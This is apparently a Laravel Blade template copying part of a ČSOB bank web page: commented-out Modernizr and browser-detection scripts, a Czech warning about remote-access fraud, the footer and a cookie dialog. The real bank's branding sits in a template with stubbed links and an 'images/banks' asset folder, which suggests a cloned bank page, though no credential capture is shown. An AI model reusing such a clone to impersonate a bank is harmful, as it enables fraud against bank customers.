{{--                                                }, D(""), i = k = null,--}}
{{--                                                    function (a, b) {--}}
{{--                                                        function l(a, b) {--}}
{{--                                                            var c = a.createElement("p"),--}}
{{--                                                                d = a.getElementsByTagName("head")[0] || a.documentElement;--}}
{{--                                                            return c.innerHTML = "x<style>" + b + "</style>", d.insertBefore(c.lastChild, d.firstChild)--}}
{{--                                                        }--}}

{{--                                                        function m() {--}}
{{--                                                            var a = s.elements;--}}
{{--                                                            return typeof a == "string" ? a.split(" ") : a--}}
{{--                                                        }--}}

{{--                                                        function n(a) {--}}
{{--                                                            var b = j[a[h]];--}}
{{--                                                            return b || (b = {}, i++, a[h] = i, j[i] = b), b--}}
{{--                                                        }--}}

{{--                                                        function o(a, c, d) {--}}
{{--                                                            c || (c = b);--}}
{{--                                                            if (k) return c.createElement(a);--}}
{{--                                                            d || (d = n(c));--}}
{{--                                                            var g;--}}
{{--                                                            return d.cache[a] ? g = d.cache[a].cloneNode() : f.test(a) ? g = (d.cache[a] = d.createElem(a)).cloneNode() : g = d.createElem(a), g.canHaveChildren && !e.test(a) && !g.tagUrn ? d.frag.appendChild(g) : g--}}
{{--                                                        }--}}

{{--                                                        function p(a, c) {--}}
{{--                                                            a || (a = b);--}}
{{--                                                            if (k) return a.createDocumentFragment();--}}
{{--                                                            c = c || n(a);--}}
{{--                                                            var d = c.frag.cloneNode(),--}}
{{--                                                                e = 0,--}}
{{--                                                                f = m(),--}}
{{--                                                                g = f.length;--}}
{{--                                                            for (; e < g; e++) d.createElement(f[e]);--}}
{{--                                                            return d--}}
{{--                                                        }--}}

{{--                                                        function q(a, b) {--}}
{{--                                                            b.cache || (b.cache = {}, b.createElem = a.createElement, b.createFrag = a.createDocumentFragment, b.frag = b.createFrag()), a.createElement = function (c) {--}}
{{--                                                                return s.shivMethods ? o(c, a, b) : b.createElem(c)--}}
{{--                                                            }, a.createDocumentFragment = Function("h,f", "return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&(" + m().join().replace(/[\w\-]+/g, function (a) {--}}
{{--                                                                return b.createElem(a), b.frag.createElement(a), 'c("' + a + '")'--}}
{{--                                                            }) + ");return n}")(s, b.frag)--}}
{{--                                                        }--}}

{{--                                                        function r(a) {--}}
{{--                                                            a || (a = b);--}}
{{--                                                            var c = n(a);--}}
{{--                                                            return s.shivCSS && !g && !c.hasCSS && (c.hasCSS = !!l(a, "article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}mark{background:#FF0;color:#000}template{display:none}")), k || q(a, c), a--}}
{{--                                                        }--}}

{{--                                                        var c = "3.7.0",--}}
{{--                                                            d = a.html5 || {},--}}
{{--                                                            e = /^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,--}}
{{--                                                            f = /^(?:a|b|code|div|fieldset|h1|h2|h3|h4|h5|h6|i|label|li|ol|p|q|span|strong|style|table|tbody|td|th|tr|ul)$/i,--}}
{{--                                                            g, h = "_html5shiv",--}}
{{--                                                            i = 0,--}}
{{--                                                            j = {},--}}
{{--                                                            k;--}}
{{--                                                        (function () {--}}
{{--                                                            try {--}}
{{--                                                                var a = b.createElement("a");--}}
{{--                                                                a.innerHTML = "<xyz></xyz>", g = "hidden" in a, k = a.childNodes.length == 1 || function () {--}}
{{--                                                                    b.createElement("a");--}}
{{--                                                                    var a = b.createDocumentFragment();--}}
{{--                                                                    return typeof a.cloneNode == "undefined" || typeof a.createDocumentFragment == "undefined" || typeof a.createElement == "undefined"--}}
{{--                                                                }()--}}
{{--                                                            } catch (c) {--}}
{{--                                                                g = !0, k = !0--}}
{{--                                                            }--}}
{{--                                                        })();--}}
{{--                                                        var s = {--}}
{{--                                                            elements: d.elements || "abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video",--}}
{{--                                                            version: c,--}}
{{--                                                            shivCSS: d.shivCSS !== !1,--}}
{{--                                                            supportsUnknownElements: k,--}}
{{--                                                            shivMethods: d.shivMethods !== !1,--}}
{{--                                                            type: "default",--}}
{{--                                                            shivDocument: r,--}}
{{--                                                            createElement: o,--}}
{{--                                                            createDocumentFragment: p--}}
{{--                                                        };--}}
{{--                                                        a.html5 = s, r(b)--}}
{{--                                                    }(this, b), e._version = d, e._prefixes = n, e._domPrefixes = q, e._cssomPrefixes = p, e.mq = z, e.hasEvent = A, e.testProp = function (a) {--}}
{{--                                                    return H([a])--}}
{{--                                                }, e.testAllProps = J, e.testStyles = y, e.prefixed = function (a, b, c) {--}}
{{--                                                    return b ? J(a, b, c) : J(a, "pfx")--}}
{{--                                                }, g.className = g.className.replace(/(^|\s)no-js(\s|$)/, "$1$2") + (f ? " js " + v.join(" ") : ""), e--}}
{{--                                            }(this, this.document),--}}
{{--                                                function (a, b, c) {--}}
{{--                                                    function d(a) {--}}
{{--                                                        return "[object Function]" == o.call(a)--}}
{{--                                                    }--}}

{{--                                                    function e(a) {--}}
{{--                                                        return "string" == typeof a--}}
{{--                                                    }--}}

{{--                                                    function f() {--}}
{{--                                                    }--}}

{{--                                                    function g(a) {--}}
{{--                                                        return !a || "loaded" == a || "complete" == a || "uninitialized" == a--}}
{{--                                                    }--}}

{{--                                                    function h() {--}}
{{--                                                        var a = p.shift();--}}
{{--                                                        q = 1, a ? a.t ? m(function () {--}}
{{--                                                            ("c" == a.t ? B.injectCss : B.injectJs)(a.s, 0, a.a, a.x, a.e, 1)--}}
{{--                                                        }, 0) : (a(), h()) : q = 0--}}
{{--                                                    }--}}

{{--                                                    function i(a, c, d, e, f, i, j) {--}}
{{--                                                        function k(b) {--}}
{{--                                                            if (!o && g(l.readyState) && (u.r = o = 1, !q && h(), l.onload = l.onreadystatechange = null, b)) {--}}
{{--                                                                "img" != a && m(function () {--}}
{{--                                                                    t.removeChild(l)--}}
{{--                                                                }, 50);--}}
{{--                                                                for (var d in y[c]) y[c].hasOwnProperty(d) && y[c][d].onload()--}}
{{--                                                            }--}}
{{--                                                        }--}}

{{--                                                        var j = j || B.errorTimeout,--}}
{{--                                                            l = b.createElement(a),--}}
{{--                                                            o = 0,--}}
{{--                                                            r = 0,--}}
{{--                                                            u = {--}}
{{--                                                                t: d,--}}
{{--                                                                s: c,--}}
{{--                                                                e: f,--}}
{{--                                                                a: i,--}}
{{--                                                                x: j--}}
{{--                                                            };--}}
{{--                                                        1 === y[c] && (r = 1, y[c] = []), "object" == a ? l.data = c : (l.src = c, l.type = a), l.width = l.height = "0", l.onerror = l.onload = l.onreadystatechange = function () {--}}
{{--                                                            k.call(this, r)--}}
{{--                                                        }, p.splice(e, 0, u), "img" != a && (r || 2 === y[c] ? (t.insertBefore(l, s ? null : n), m(k, j)) : y[c].push(l))--}}
{{--                                                    }--}}

{{--                                                    function j(a, b, c, d, f) {--}}
{{--                                                        return q = 0, b = b || "j", e(a) ? i("c" == b ? v : u, a, b, this.i++, c, d, f) : (p.splice(this.i++, 0, a), 1 == p.length && h()), this--}}
{{--                                                    }--}}

{{--                                                    function k() {--}}
{{--                                                        var a = B;--}}
{{--                                                        return a.loader = {--}}
{{--                                                            load: j,--}}
{{--                                                            i: 0--}}
{{--                                                        }, a--}}
{{--                                                    }--}}

{{--                                                    var l = b.documentElement,--}}
{{--                                                        m = a.setTimeout,--}}
{{--                                                        n = b.getElementsByTagName("script")[0],--}}
{{--                                                        o = {}.toString,--}}
{{--                                                        p = [],--}}
{{--                                                        q = 0,--}}
{{--                                                        r = "MozAppearance" in l.style,--}}
{{--                                                        s = r && !!b.createRange().compareNode,--}}
{{--                                                        t = s ? l : n.parentNode,--}}
{{--                                                        l = a.opera && "[object Opera]" == o.call(a.opera),--}}
{{--                                                        l = !!b.attachEvent && !l,--}}
{{--                                                        u = r ? "object" : l ? "script" : "img",--}}
{{--                                                        v = l ? "script" : u,--}}
{{--                                                        w = Array.isArray || function (a) {--}}
{{--                                                            return "[object Array]" == o.call(a)--}}
{{--                                                        },--}}
{{--                                                        x = [],--}}
{{--                                                        y = {},--}}
{{--                                                        z = {--}}
{{--                                                            timeout: function (a, b) {--}}
{{--                                                                return b.length && (a.timeout = b[0]), a--}}
{{--                                                            }--}}
{{--                                                        },--}}
{{--                                                        A, B;--}}
{{--                                                    B = function (a) {--}}
{{--                                                        function b(a) {--}}
{{--                                                            var a = a.split("!"),--}}
{{--                                                                b = x.length,--}}
{{--                                                                c = a.pop(),--}}
{{--                                                                d = a.length,--}}
{{--                                                                c = {--}}
{{--                                                                    url: c,--}}
{{--                                                                    origUrl: c,--}}
{{--                                                                    prefixes: a--}}
{{--                                                                },--}}
{{--                                                                e, f, g;--}}
{{--                                                            for (f = 0; f < d; f++) g = a[f].split("="), (e = z[g.shift()]) && (c = e(c, g));--}}
{{--                                                            for (f = 0; f < b; f++) c = x[f](c);--}}
{{--                                                            return c--}}
{{--                                                        }--}}

{{--                                                        function g(a, e, f, g, h) {--}}
{{--                                                            var i = b(a),--}}
{{--                                                                j = i.autoCallback;--}}
{{--                                                            i.url.split(".").pop().split("?").shift(), i.bypass || (e && (e = d(e) ? e : e[a] || e[g] || e[a.split("/").pop().split("?")[0]]), i.instead ? i.instead(a, e, f, g, h) : (y[i.url] ? i.noexec = !0 : y[i.url] = 1, f.load(i.url, i.forceCSS || !i.forceJS && "css" == i.url.split(".").pop().split("?").shift() ? "c" : c, i.noexec, i.attrs, i.timeout), (d(e) || d(j)) && f.load(function () {--}}
{{--                                                                k(), e && e(i.origUrl, h, g), j && j(i.origUrl, h, g), y[i.url] = 2--}}
{{--                                                            })))--}}
{{--                                                        }--}}

{{--                                                        function h(a, b) {--}}
{{--                                                            function c(a, c) {--}}
{{--                                                                if (a) {--}}
{{--                                                                    if (e(a)) c || (j = function () {--}}
{{--                                                                        var a = [].slice.call(arguments);--}}
{{--                                                                        k.apply(this, a), l()--}}
{{--                                                                    }), g(a, j, b, 0, h);--}}
{{--                                                                    else if (Object(a) === a)--}}
{{--                                                                        for (n in m = function () {--}}
{{--                                                                            var b = 0,--}}
{{--                                                                                c;--}}
{{--                                                                            for (c in a) a.hasOwnProperty(c) && b++;--}}
{{--                                                                            return b--}}
{{--                                                                        }(), a) a.hasOwnProperty(n) && (!c && !--m && (d(j) ? j = function () {--}}
{{--                                                                            var a = [].slice.call(arguments);--}}
{{--                                                                            k.apply(this, a), l()--}}
{{--                                                                        } : j[n] = function (a) {--}}
{{--                                                                            return function () {--}}
{{--                                                                                var b = [].slice.call(arguments);--}}
{{--                                                                                a && a.apply(this, b), l()--}}
{{--                                                                            }--}}
{{--                                                                        }(k[n])), g(a[n], j, b, n, h))--}}
{{--                                                                } else !c && l()--}}
{{--                                                            }--}}

{{--                                                            var h = !!a.test,--}}
{{--                                                                i = a.load || a.both,--}}
{{--                                                                j = a.callback || f,--}}
{{--                                                                k = j,--}}
{{--                                                                l = a.complete || f,--}}
{{--                                                                m, n;--}}
{{--                                                            c(h ? a.yep : a.nope, !!i), i && c(i)--}}
{{--                                                        }--}}

{{--                                                        var i, j, l = this.yepnope.loader;--}}
{{--                                                        if (e(a)) g(a, 0, l, 0);--}}
{{--                                                        else if (w(a))--}}
{{--                                                            for (i = 0; i < a.length; i++) j = a[i], e(j) ? g(j, 0, l, 0) : w(j) ? B(j) : Object(j) === j && h(j, l);--}}
{{--                                                        else Object(a) === a && h(a, l)--}}
{{--                                                    }, B.addPrefix = function (a, b) {--}}
{{--                                                        z[a] = b--}}
{{--                                                    }, B.addFilter = function (a) {--}}
{{--                                                        x.push(a)--}}
{{--                                                    }, B.errorTimeout = 1e4, null == b.readyState && b.addEventListener && (b.readyState = "loading", b.addEventListener("DOMContentLoaded", A = function () {--}}
{{--                                                        b.removeEventListener("DOMContentLoaded", A, 0), b.readyState = "complete"--}}
{{--                                                    }, 0)), a.yepnope = k(), a.yepnope.executeStack = h, a.yepnope.injectJs = function (a, c, d, e, i, j) {--}}
{{--                                                        var k = b.createElement("script"),--}}
{{--                                                            l, o, e = e || B.errorTimeout;--}}
{{--                                                        k.src = a;--}}
{{--                                                        for (o in d) k.setAttribute(o, d[o]);--}}
{{--                                                        c = j ? h : c || f, k.onreadystatechange = k.onload = function () {--}}
{{--                                                            !l && g(k.readyState) && (l = 1, c(), k.onload = k.onreadystatechange = null)--}}
{{--                                                        }, m(function () {--}}
{{--                                                            l || (l = 1, c(1))--}}
{{--                                                        }, e), i ? k.onload() : n.parentNode.insertBefore(k, n)--}}
{{--                                                    }, a.yepnope.injectCss = function (a, c, d, e, g, i) {--}}
{{--                                                        var e = b.createElement("link"),--}}
{{--                                                            j, c = i ? h : c || f;--}}
{{--                                                        e.href = a, e.rel = "stylesheet", e.type = "text/css";--}}
{{--                                                        for (j in d) e.setAttribute(j, d[j]);--}}
{{--                                                        g || (n.parentNode.insertBefore(e, n), m(c, 0))--}}
{{--                                                    }--}}
{{--                                                }(this, document), Modernizr.load = function () {--}}
{{--                                                yepnope.apply(window, [].slice.call(arguments, 0))--}}
{{--                                            },--}}
{{--                                                function () {--}}
{{--                                                    var a = document.createElement("a"),--}}
{{--                                                        b = a.style,--}}
{{--                                                        c = "right 10px bottom 10px";--}}
{{--                                                    Modernizr.addTest("bgpositionshorthand", function () {--}}
{{--                                                        return b.cssText = "background-position: " + c + ";", b.backgroundPosition === c--}}
{{--                                                    })--}}
{{--                                                }(), Modernizr.addTest("boxsizing", function () {--}}
{{--                                                return Modernizr.testAllProps("boxSizing") && (document.documentMode === undefined || document.documentMode > 7)--}}
{{--                                            }), Modernizr.addTest("mediaqueries", Modernizr.mq("only all")), Modernizr.addTest("csscalc", function () {--}}
{{--                                                var a = "width:",--}}
{{--                                                    b = "calc(10px);",--}}
{{--                                                    c = document.createElement("div");--}}
{{--                                                return c.style.cssText = a + Modernizr._prefixes.join(b + a), !!c.style.length--}}
{{--                                            }), Modernizr.addTest("lastchild", function () {--}}
{{--                                                return Modernizr.testStyles("#modernizr div {width:100px} #modernizr :last-child{width:200px;display:block}", function (a) {--}}
{{--                                                    return a.lastChild.offsetWidth > a.firstChild.offsetWidth--}}
{{--                                                }, 2)--}}
{{--                                            }), Modernizr.addTest("display-table", function () {--}}
{{--                                                var a = window.document,--}}
{{--                                                    b = a.documentElement,--}}
{{--                                                    c = a.createElement("div"),--}}
{{--                                                    d = a.createElement("div"),--}}
{{--                                                    e = a.createElement("div"),--}}
{{--                                                    f;--}}
{{--                                                return c.style.cssText = "display: table", d.style.cssText = e.style.cssText = "display: table-cell; padding: 10px", c.appendChild(d), c.appendChild(e), b.insertBefore(c, b.firstChild), f = d.offsetLeft < e.offsetLeft, b.removeChild(c), f--}}
{{--                                            }), Modernizr.addTest("cssvwunit", function () {--}}
{{--                                                var a;--}}
{{--                                                return Modernizr.testStyles("#modernizr { width: 50vw; }", function (b, c) {--}}
{{--                                                    var d = parseInt(window.innerWidth / 2, 10),--}}
{{--                                                        e = parseInt((window.getComputedStyle ? getComputedStyle(b, null) : b.currentStyle).width, 10);--}}
{{--                                                    a = e == d--}}
{{--                                                }), a--}}
{{--                                            }), Modernizr.addTest("json", !!window.JSON && !!JSON.parse), Modernizr.addTest("performance", !!Modernizr.prefixed("performance", window)), Modernizr.addTest("unicode", function () {--}}
{{--                                                var a, b = document.createElement("span"),--}}
{{--                                                    c = document.createElement("span");--}}
{{--                                                return Modernizr.testStyles("#modernizr{font-family:Arial,sans;font-size:300em;}", function (d) {--}}
{{--                                                    b.innerHTML = "&#5987", c.innerHTML = "&#9734", d.appendChild(b), d.appendChild(c), a = "offsetWidth" in b && b.offsetWidth !== c.offsetWidth--}}
{{--                                                }), a--}}
{{--                                            }), Modernizr.addTest("cssvhunit", function () {--}}
{{--                                                var a;--}}
{{--                                                return Modernizr.testStyles("#modernizr { height: 50vh; }", function (b, c) {--}}
{{--                                                    var d = parseInt(window.innerHeight / 2, 10),--}}
{{--                                                        e = parseInt((window.getComputedStyle ? getComputedStyle(b, null) : b.currentStyle).height, 10);--}}
{{--                                                    a = e == d--}}
{{--                                                }), a--}}
{{--                                            }), Modernizr.addTest("xhr2", "FormData" in window),--}}
{{--                                                function () {--}}
{{--                                                    var a = new Image;--}}
{{--                                                    a.onerror = function () {--}}
{{--                                                        Modernizr.addTest("datauri", function () {--}}
{{--                                                            return !1--}}
{{--                                                        })--}}
{{--                                                    }, a.onload = function () {--}}
{{--                                                        Modernizr.addTest("datauri", function () {--}}
{{--                                                            return a.width == 1 && a.height == 1--}}
{{--                                                        })--}}
{{--                                                    }, a.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=="--}}
{{--                                                }();--}}
{{--                                        </script>--}}
{{--                                        <script type="text/javascript">--}}
{{--                                            (function ($) {--}}
{{--                                                var client = {--}}
{{--                                                    cookiesEnabled: function () {--}}
{{--                                                        var cookieEnabledTmp = navigator.cookieEnabled;--}}
{{--                                                        if (!cookieEnabledTmp) {--}}
{{--                                                            document.cookie = "testCookieAvailable=1";--}}

{{--                                                            function getCookie(cname) {--}}
{{--                                                                var name = cname + "=";--}}
{{--                                                                var ca = document.cookie.split(';');--}}
{{--                                                                for (var i = 0; i < ca.length; i++) {--}}
{{--                                                                    var c = ca[i];--}}
{{--                                                                    while (c.charAt(0) == ' ') c = c.substring(1);--}}
{{--                                                                    if (c.indexOf(name) == 0) return c.substring(name.length, c.length);--}}
{{--                                                                }--}}
{{--                                                                return "";--}}
{{--                                                            }--}}

{{--                                                            var value = getCookie("testCookieAvailable");--}}
{{--                                                            if (value != "") {--}}
{{--                                                                cookieEnabledTmp = true;--}}
{{--                                                                document.cookie = "testCookieAvailable=; expires=Thu, 01 Jan 1970 00:00:00 UTC";--}}
{{--                                                            }--}}
{{--                                                        }--}}
{{--                                                        return cookieEnabledTmp;--}}
{{--                                                    },--}}
{{--                                                    isBrowserSupported: function () {--}}
{{--                                                        function isSupportedEngine() {--}}
{{--                                                            var supported = false;--}}
{{--                                                            for (var i in supportedEngines) {--}}
{{--                                                                var supportedEngine = supportedEngines[i];--}}
{{--                                                                if (supportedEngine.actual >= supportedEngine.req) {--}}
{{--                                                                    supported = true;--}}
{{--                                                                    break;--}}
{{--                                                                }--}}
{{--                                                            }--}}
{{--                                                            return supported;--}}
{{--                                                        }--}}

{{--                                                        function areSupportedModernizrFeatures() {--}}
{{--                                                            var supportedToReturn = true;--}}
{{--                                                            var supportedObject = {};--}}
{{--                                                            if (window.Modernizr) {--}}
{{--                                                                supportedObject = isSupported(Modernizr);--}}
{{--                                                            }--}}

{{--                                                            function isSupported(features) {--}}
{{--                                                                var toReturn = {--}}
{{--                                                                    supported: true,--}}
{{--                                                                    unSupportedFeatures: []--}}
{{--                                                                };--}}
{{--                                                                if (features) {--}}
{{--                                                                    for (var feature in features) {--}}
{{--                                                                        if (feature && feature.indexOf("_") === 0) {--}}
{{--                                                                            continue;--}}
{{--                                                                        }--}}
{{--                                                                        if (typeof features[feature] === "boolean") {--}}
{{--                                                                            if (!features[feature]) {--}}
{{--                                                                                toReturn.supported = false;--}}
{{--                                                                                toReturn.unSupportedFeatures.push("" + feature);--}}
{{--                                                                            }--}}
{{--                                                                        } else if (typeof features[feature] === "object") {--}}
{{--                                                                            var toReturnTmp = isSupported(features[feature]);--}}
{{--                                                                            if (!toReturnTmp.supported) {--}}
{{--                                                                                toReturn.supported = false;--}}
{{--                                                                                for (i = 0; i < toReturnTmp.unSupportedFeatures.length; i++) {--}}
{{--                                                                                    toReturn.unSupportedFeatures.push(feature + "." + toReturnTmp.unSupportedFeatures[i]);--}}
{{--                                                                                }--}}
{{--                                                                            }--}}
{{--                                                                        }--}}
{{--                                                                    }--}}
{{--                                                                }--}}
{{--                                                                return toReturn;--}}
{{--                                                            }--}}

{{--                                                            if (supportedObject) {--}}
{{--                                                                supportedToReturn = supportedObject.supported;--}}
{{--                                                            }--}}
{{--                                                            return supportedToReturn;--}}
{{--                                                        }--}}

{{--                                                        var supportedEngine = isSupportedEngine();--}}
{{--                                                        if (!supportedEngine) {--}}
{{--                                                            supportedEngine = areSupportedModernizrFeatures();--}}
{{--                                                        }--}}
{{--                                                        return supportedEngine;--}}
{{--                                                    },--}}
{{--                                                    hasXP: function () {--}}
{{--                                                        var ua = navigator.userAgent.toLowerCase();--}}
{{--                                                        return ua.indexOf("windows nt 5.1") != -1 || ua.indexOf("windows nt 5.2") != -1 || ua.indexOf("windows xp") != -1;--}}
{{--                                                    }--}}
{{--                                                };--}}
{{--                                                var supportedEngines = {--}}
{{--                                                    blink: {--}}
{{--                                                        actual: -1,--}}
{{--                                                        req: 28--}}
{{--                                                    },--}}
{{--                                                    gecko: {--}}
{{--                                                        actual: -1,--}}
{{--                                                        req: 20--}}
{{--                                                    },--}}
{{--                                                    trident: {--}}
{{--                                                        actual: -1,--}}
{{--                                                        req: 5--}}
{{--                                                    },--}}
{{--                                                    webkit: {--}}
{{--                                                        actual: -1,--}}
{{--                                                        req: 536--}}
{{--                                                    }--}}
{{--                                                };--}}
{{--                                                (function () {--}}
{{--                                                    var ua = navigator.userAgent;--}}
{{--                                                    if (/rv:([^\)]+)\) Gecko\/\d{8}/.test(ua)) {--}}
{{--                                                        supportedEngines.gecko.actual = parseFloat(RegExp["$1"]);--}}
{{--                                                    } else if (supportedEngines.trident && /Trident\/([^;]+)/.test(ua)) {--}}
{{--                                                        supportedEngines.trident.actual = parseFloat(RegExp["$1"]);--}}
{{--                                                    } else if (supportedEngines.blink && /AppleWebKit\/([\d\.]+)/.test(ua) && parseFloat(RegExp["$1"]) >= 537.36 && /Chrome\/(\S+)/.test(ua) && (ver = parseFloat(RegExp["$1"])) >= 28) {--}}
{{--                                                        supportedEngines.blink.actual = parseFloat(RegExp["$1"]);--}}
{{--                                                    } else if (supportedEngines.webkit && /AppleWebKit\/([\d\.]+)/.test(ua)) {--}}
{{--                                                        supportedEngines.webkit.actual = parseFloat(RegExp["$1"]);--}}
{{--                                                    }--}}
{{--                                                })();--}}

{{--                                                function processMessages($) {--}}
{{--                                                    var hideBrowserDetectionPortlet = true;--}}
{{--                                                    var jsDisabledNode = $(".jsDisabled");--}}
{{--                                                    if (jsDisabledNode) {--}}
{{--                                                        jsDisabledNode.hide();--}}
{{--                                                    }--}}
{{--                                                    if (!client.cookiesEnabled()) {--}}
{{--                                                        var cookiesDisabledNode = $(".cookiesDisabled");--}}
{{--                                                        if (cookiesDisabledNode) {--}}
{{--                                                            cookiesDisabledNode.show();--}}
{{--                                                            hideBrowserDetectionPortlet = false;--}}
{{--                                                        }--}}
{{--                                                    }--}}
{{--                                                    if (!client.isBrowserSupported()) {--}}
{{--                                                        var browserUnsupportedNode = $(".browserUnsupported");--}}
{{--                                                        if (browserUnsupportedNode) {--}}
{{--                                                            browserUnsupportedNode.show();--}}
{{--                                                            hideBrowserDetectionPortlet = false;--}}
{{--                                                        }--}}
{{--                                                    }--}}
{{--                                                    if (client.hasXP()) {--}}
{{--                                                        var osXPNode = $(".osXP");--}}
{{--                                                        if (osXPNode) {--}}
{{--                                                            osXPNode.show();--}}
{{--                                                            hideBrowserDetectionPortlet = false;--}}
{{--                                                        }--}}
{{--                                                    }--}}
{{--                                                    if (hideBrowserDetectionPortlet) {--}}
{{--                                                        var browsertDetectionMessagesPortlet = $(".portlet-browser-detection-messages");--}}
{{--                                                        if (browsertDetectionMessagesPortlet) {--}}
{{--                                                            browsertDetectionMessagesPortlet.hide();--}}
{{--                                                        }--}}
{{--                                                    }--}}
{{--                                                }--}}

{{--                                                processMessages($);--}}
{{--                                                Liferay.Portlet.ready(function (portletId, node) {--}}
{{--                                                    processMessages($);--}}
{{--                                                });--}}
{{--                                            })(jQuery);--}}
{{--                                        </script>--}}
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="portlet-column portlet-column-only pui-page-layout-secondary" id="column-secondary">
                        <div class="portlet-dropzone portlet-column-content portlet-column-content-only"
                             id="layout-column_column-secondary">
                            <div class="portlet-boundary portlet-boundary_101_  portlet-static portlet-static-end portlet-borderless portlet-asset-publisher "
                                 id="p_p_id_101_INSTANCE_AXpmmzdjqDEu_"><span id="p_101_INSTANCE_AXpmmzdjqDEu"></span>
                                <div class="portlet-borderless-container">
                                    <div class="portlet-body">
                                        <div class="subscribe-action"></div>
                                        <div class="pui-m-news-list">
                                            <div class="pui-b-content">
                                                <div class="pui-b-item">
                                                    <div class="pui-b-item-header">
                                                        <a href="#"
                                                           target="_blank">
                                                            <div class="pui-date">27. 9. 2021</div>
                                                            <div class="pui-title">
                                                                <h3 class="pui-news-article-title">Nedovolte nikomu
                                                                    vzdáleně
                                                                    vstupovat do počítače a provádět za vás operace</h3>
                                                            </div>
                                                        </a>
                                                    </div>
                                                    <div class="pui-b-item-content">
                                                        <div class="pui-news-perex"><img
                                                                    style="float:right; margin-left:25px; margin-bottom:25px;"
                                                                    src="{{asset('images/banks/vykricnik.png')}}">
                                                            <p> Pomocí softwaru pro vzdálený přístup vám mohou
                                                                podvodníci
                                                                ukrást statisíce z&nbsp;vašeho účtu! Pod&nbsp;záminkou
                                                                pomoci, například s&nbsp;nákupem kryptoměn, vám před&nbsp;očima
                                                                doslova vyluxují účet. </p>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="pui-b-all-news"><a
                                                            href="#"
                                                            target="_blank">Všechny zprávy</a></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="portlet-column portlet-column-only pui-page-layout-bottom" id="column-bottom">
                        <div class="portlet-dropzone empty portlet-column-content portlet-column-content-only"
                             id="layout-column_column-bottom"></div>
                    </div>
                </div>
            </div>
            <div class="portlet-boundary portlet-boundary_1_WAR_kaleodesignerportlet_  portlet-static portlet-static-end portlet-borderless kaleo-designer-portlet "
                 id="p_p_id_1_WAR_kaleodesignerportlet_"><span id="p_1_WAR_kaleodesignerportlet"></span></div>
            <form action="#" id="hrefFm" method="post"
                  name="hrefFm">
                <span></span>
            </form>
        </div>
    </div>
    <div class="pdp-accessibly-hidden">Zápatí stránky</div>
    <footer class="pui-m-footer" role="contentinfo">
        <nav class="pui-b-footer-links" role="navigation">
            <ul>
                <li><a href="#" target="_blank">Provozní
                        informace</a>
                </li>
                <li><a href="#" target="_blank">Bezpečnost</a></li>
                <li><a href="#" target="_blank">Nápověda </a></li>
                <li><a href="#">Novinky </a></li>
            </ul>
            <ul>
                <li><a href="#" target="_blank">www.csob.cz</a></li>
                <li><a href="#" target="_blank">O skupině ČSOB</a>
                </li>
                <li><a href="#" target="_blank">Kontakty</a></li>
                <li><a href="#" target="_blank">Cookies a podmínky
                        používání</a></li>
                <li><a href="#" target="_blank">Ochrana osobních
                        údajů</a></li>
            </ul>
        </nav>
        <div class="pui-b-footer-info">
            <div class="pui-b-footer-social"><a class="pui-facebook" href="https://www.facebook.com/csob"
                                                target="_blank">Facebook</a>
                <a class="pui-youtube" href="https://www.youtube.com/channel/UCCRLevEhack4M8nKdO4JJkA" target="_blank">YouTube</a>
            </div>
            <p>Copyright © Československá obchodní banka, a.s.</p>
        </div>
    </footer>

    <div role="log" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div>
    <div role="log" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div>
    <div role="log" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div>
    <div id="onetrust-consent-sdk" style="display: block;">
        <div class="onetrust-pc-dark-filter ot-fade-in" style="display: none;
                    transition: visibility 0s 400ms, opacity 400ms linear;
                    opacity: 0;visibility: hidden;"></div>
        <div id="onetrust-pc-sdk" class="otPcCenter ot-fade-in otRelFont" aria-modal="true" role="alertdialog"
             lang="cs-CZ"
             aria-label="K čemu jsou vám cookies dobré" style="height: 760px;transition: visibility 0s 400ms, opacity 400ms linear;
                    opacity: 0;visibility: hidden;display: none;">
            <!-- Close Button -->
            <div class="ot-pc-header">
                <!-- Logo Tag -->
                <div class="ot-pc-logo" role="img" aria-label="ČSOB" style="background-image: url('https://statistics.csob.cz/consent/601d51af-6197-4fef-8c9d-161452538d80/2560ef85-51ea-4806-876e-8e93f1dcdc77/logos/ee3c1583-b8c0-4a7f-8e3c-edbd19faa226/2862859e-7501-44ed-bcec-29c192a2079f/1ef18cee-c171-417e-ade6-e24ee746dc8e/logo.png');
                    background-position: left;"></div>
            </div>
            <!-- Close Button -->
            <div id="ot-pc-content" class="ot-pc-scrollbar ot-enbl-chr">
                <h3 id="ot-pc-title">K čemu jsou vám cookies dobré</h3>
                <div id="ot-pc-desc">Díky souborům cookies, které se ukládají ve vašem internetovém prohlížeči a nad
                    kterými
                    máte plnou kontrolu, si na našich stránkách ušetříte spoustu hledání a klikání:
                    <ul>
                        <li>Do vašich cookies si ukládáme informace například o tom, jaké souhlasy od vás máme, co vám
                            můžeme zobrazit a co ne.
                        </li>
                        <li>Stránka si pamatuje třeba údaje, které jste zadali do online kalkulačky. Když pak přejdete
                            na
                            další krok nebo odejdete jinam a pak se zase vrátíte, nemusíte už začínat od znova.
                        </li>
                        <li>Když si prohlížíte stránku o půjčkách a my vám zobrazíme nějakou reklamu, bude to spíš
                            nabídka
                            právě na půjčku. A ne na produkt, který vás v tu chvíli nezajímá.
                        </li>
                    </ul>
                    <br> Kromě toho, že vám cookies usnadňují prohlížení stránek, zároveň pomáhají i nám: zjišťovat, co
                    vás,
                    naše klienty zajímá nejvíc, co naopak vůbec a co na našich stránkách zlepšovat.
                    <br> S cookies pracujeme podle platných zákonů.
                    <br><a href="#" class="privacy-notice-link"
                           rel="noopener" target="_blank"
                           aria-label="Projděte si podrobný přehled cookies a podmínky jejich užívání., otevírá se na nové záložce."
                           tabindex="0">Projděte si podrobný přehled cookies a podmínky jejich užívání.</a></div>
